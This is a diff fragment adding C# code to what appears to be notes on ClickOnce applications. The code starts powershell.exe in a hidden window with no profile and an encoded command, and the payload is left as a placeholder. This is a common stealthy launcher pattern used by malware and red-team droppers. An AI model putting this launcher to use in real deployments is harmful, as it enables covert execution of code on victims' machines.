@@ -56,3 +56,36 @@ namespace ClickOnce
 }
 
 ```
+
+```
+
+using System.Text;
+using System.Threading.Tasks;
+using System.Diagnostics;
+
+namespace ClickOnce
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+
+            var si = new ProcessStartInfo
+            {
+                FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                Arguments = @"-Sta -Nop -Window Hidden -EncodedCommand <blah>"
+            };
+
+            var proc = new Process
+            {
+                StartInfo = si
+            };
+
+            proc.Start();
+            proc.WaitForExit();
+            proc.Dispose();
+        }
+    }
+}
+
+```
